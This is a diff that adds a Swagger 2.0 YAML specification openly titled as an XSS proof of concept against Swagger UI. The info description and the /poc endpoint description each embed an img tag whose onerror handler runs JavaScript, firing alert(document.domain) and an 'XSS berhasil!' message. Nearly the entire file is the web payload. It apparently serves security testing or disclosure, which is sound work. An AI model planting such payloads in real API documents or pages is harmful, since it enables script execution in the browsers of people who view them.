@@ -1,0 +1,20 @@
+swagger: "2.0"
+info:
+  title: XSS PoC via Swagger UI
+  description: |
+    <img src="x" onerror="alert(document.domain)">
+  version: "1.0"
+
+host: example.com
+basePath: /
+schemes:
+  - https
+paths:
+  /poc:
+    get:
+      summary: Test endpoint
+      description: |
+        <img src="x" onerror="alert('XSS berhasil!')">
+      responses:
+        '200':
+          description: OK
